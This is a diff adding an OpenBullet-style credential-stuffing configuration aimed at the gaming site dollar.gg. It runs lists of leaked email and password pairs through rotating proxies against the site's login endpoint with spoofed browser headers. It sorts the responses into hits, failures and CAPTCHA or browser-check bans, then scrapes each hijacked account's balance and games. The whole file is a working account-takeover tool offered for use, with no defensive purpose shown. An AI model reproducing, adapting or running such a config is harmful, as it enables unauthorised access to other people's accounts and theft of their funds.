@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "dollar.gg",
+  "SuggestedBots": 150,
+  "LastModified": "2019-05-10T17:44:50.2649273-04:00",
+  "AdditionalInfo": "",
+  "Author": "LethalLuck",
+  "Version": "1.2.8 Anomaly",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://dollar.gg/ajax?act=login" 
+  CONTENT "as-email=<USER>&as-pass=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://dollar.gg/register" 
+
+KEYCHECK 
+  KEYCHAIN Success AND 
+    KEY "success" 
+    KEY "<SOURCE>" DoesNotContain "have to complete a CAPTCHA" 
+  KEYCHAIN Failure OR 
+    KEY "status\":\"false" 
+  KEYCHAIN Ban OR 
+    KEY "have to complete a CAPTCHA" 
+    KEY "Checking your browser before accessing" 
+
+REQUEST GET "https://dollar.gg/profile" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "\"depo\"><span>" "</span>" -> CAP "Balance" "$" "" 
+
+PARSE "<SOURCE>" LR "\"word-wrap:break-word;\">" "</td>" Recursive=TRUE -> CAP "Game(s)" 
+
